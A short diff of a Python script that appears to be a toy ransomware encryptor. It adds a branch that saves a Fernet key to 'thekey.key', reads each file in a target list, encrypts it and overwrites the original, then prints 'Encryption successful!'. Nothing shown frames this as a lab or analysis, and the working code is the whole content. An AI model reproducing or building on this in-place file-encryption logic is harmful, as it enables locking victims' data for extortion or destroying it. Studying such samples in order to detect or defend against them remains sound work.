@@ -31,6 +31,21 @@ if os.path.exists('thekey.key'):
 
                 with open(file, 'wb') as just_encrypting:
                     just_encrypting.write(encrypted)
+    print("Encryption successful!")
+    print(to_encrypt)
 
-print("Encryption successful!")
-print(to_encrypt)
+else:
+    with open ('thekey.key', 'wb') as thekey1:
+        thekey1.write(key)
+
+    for file in to_encrypt:
+        with open(file, 'rb')as encrypting:
+            contents = encrypting.read()
+
+        encrypted = fernet.Fernet(key).encrypt(contents)
+
+        with open(file, 'wb') as just_encrypting:
+            just_encrypting.write(encrypted)
+    print("Encryption successful!")
+    print(to_encrypt)
+
